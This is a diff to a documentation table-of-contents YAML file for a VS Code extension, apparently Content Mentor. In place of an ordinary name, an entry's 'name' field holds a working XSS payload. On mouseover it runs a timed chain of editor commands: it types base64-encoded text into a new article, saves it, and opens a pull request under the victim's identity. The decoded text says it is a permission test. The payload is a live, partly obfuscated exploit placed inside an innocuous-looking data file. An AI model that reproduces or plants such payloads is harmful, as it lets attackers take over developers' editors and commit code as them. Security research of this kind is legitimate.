@@ -2,5 +2,5 @@ items:
 - name: BASE-VERSION Sample Article
   href: sample-article.md
   items:
-  - name: "x' onmouseover=window.vscode.postMessage({command:'executeCommand',commandId:'workbench.action.showCommands'}) y"
+  - name: "x' onmouseover=(function(){d=[['workbench.action.quickOpen',['new-article.md']],['quickInput.accept',[]],['editor.action.selectAll',[]],['type',[{text:atob('IyMgWFNTLVdSSVRFLVRFU1QKClRoaXMgY29udGVudCB3YXMgd3JpdHRlbiB2aWEgQ29udGVudCBNZW50b3IncyBgdHlwZWAgY29tbWFuZCwgZHJpdmVuIGJ5IGFuCmF0dGFja2VyLWNvbnRyb2xsZWQgVE9DLnltbCBYU1MgY2hhaW4sIGFuZCBjb21taXR0ZWQgdmlhIGBjb250ZW50LW1lbnRvci5jcmVhdGVQUmAuCgpJZiB0aGlzIGxhbmRzIGFzIGEgY29tbWl0IGluIHNwaWNlb3ZlcmZsb3cvY20tZm9yay1wZXJtaXNzaW9uLXRlc3QgYXV0aG9yZWQKdW5kZXIgdGhlIHJldmlld2luZyAodmljdGltKSBHaXRIdWIgaWRlbnRpdHksIGl0IGNvbmZpcm1zIHRoYXQKJ0FsbG93IGVkaXRzIGZyb20gbWFpbnRhaW5lcnMnIGV4dGVuZHMgdG8gQ29udGVudCBNZW50b3IncyByYXcgR2l0IERhdGEgQVBJCndyaXRlcyAoYmxvYnMvdHJlZXMvY29tbWl0cy9yZWZzKSwgbm90IGp1c3QgdGhlIENvbnRlbnRzIEFQSSAvIHdlYiBVSSBlZGl0IGZsb3cuCgpNYXJrZXI6IENNLUZPUkstUEVSTS1URVNUCg==')}]],['workbench.action.files.save',[]],['content-mentor.createPR',[]],['quickInput.accept',[]]];t=[600,1400,2200,3000,4000,5200,6400];for(i=0;i<d.length;i++){(function(c,dl){setTimeout(function(){window.vscode.postMessage({command:'executeCommand',commandId:c[0],args:c[1]})},dl)})(d[i],t[i])}})() y"
     href: new-article.md
